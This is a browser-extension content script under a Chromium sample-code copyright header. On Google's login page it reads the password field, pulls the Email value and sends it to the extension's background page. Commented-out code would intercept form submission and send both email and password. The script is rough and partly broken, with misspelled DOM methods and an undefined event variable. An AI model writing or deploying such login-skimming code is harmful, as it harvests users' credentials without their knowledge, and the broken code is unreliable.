/*
 * Copyright (c) 2010 The Chromium Authors. All rights reserved.  Use of this
 * source code is governed by a BSD-style license that can be found in the
 * LICENSE file.
 */
var regex = /password/;
var form = document.getElementById('gaia_loginform');

if(document.getElementById('Passwd'))
  {
    //var inputs = document.getElementByTagName('input');
	  //alert(a.length);
    //alert("There is a password");
    var value = document.getElementById('Passwd').value;
    //var form = document.getElementById('gaia_loginform');
    //alert(value);
    alert(form.elements["Email"].value);
    var val = form.elements["Email"].value;
    var currentURL = document.location.href;
    //alert(currentURL);
    //for( var i=0; i<document.forms.length; i++)
    //{
      /**
      var signup = document.getElementById('signIn');
      signup.addEventlistener("submit", function(){
      //var data = [form.elements["Email"].value, form.elements["Passwd"].value];
      var val = form.elements["Email"].value;
      evt.preventDefault();
      chrome.extension.sendRequest({'data':val}, function(response){alert(response);}
      );**/
    if(form != null)
    {
      //alert("NULL");
      var signup = document.getElementById('signIn');

    }
  
	 chrome.extension.sendRequest({'data':val},function(response) {alert(response);});
  
  }
/**
var a = document.getElementByTagName('input');
for(var i = 0; i < a.length; i++)
{
  alert(a.length);
  alert("hi");
  if(a[i].type == 'password')
  {
    alert("password");
	//chrome.extension.sendRequest({}, function(response) {});
  }  
}
**/
// Test the text of the body element against our regular expression.
if (regex.test(document.body.innerText)) {
  // The regular expression produced a match, so notify the background page.
  //chrome.extension.sendRequest({}, function(response) {});
  //alert("hello1");
} 

else {
  // No match was found.
}
